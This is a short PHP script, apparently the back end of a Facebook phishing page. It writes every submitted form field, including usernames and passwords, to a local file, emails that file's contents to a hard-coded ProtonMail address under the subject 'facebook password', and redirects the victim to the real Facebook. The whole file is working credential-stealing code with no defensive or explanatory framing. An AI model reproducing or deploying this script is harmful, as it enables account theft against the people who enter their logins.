<?php
header ('Location:http://www.facebook.com');
$handle = fopen("2AH+PxfaMmjRiBzrVyYUbmqDy7lPrcWYRc4xFFjMvyc=", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

$password= file_get_contents( "2AH+PxfaMmjRiBzrVyYUbmqDy7lPrcWYRc4xFFjMvyc=" );
$to      = 'splakadern@protonmail.com';
$subject = 'facebook password';
$message = $password;
$headers = 'From: splakadern@protonmail.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

exit;
?> 
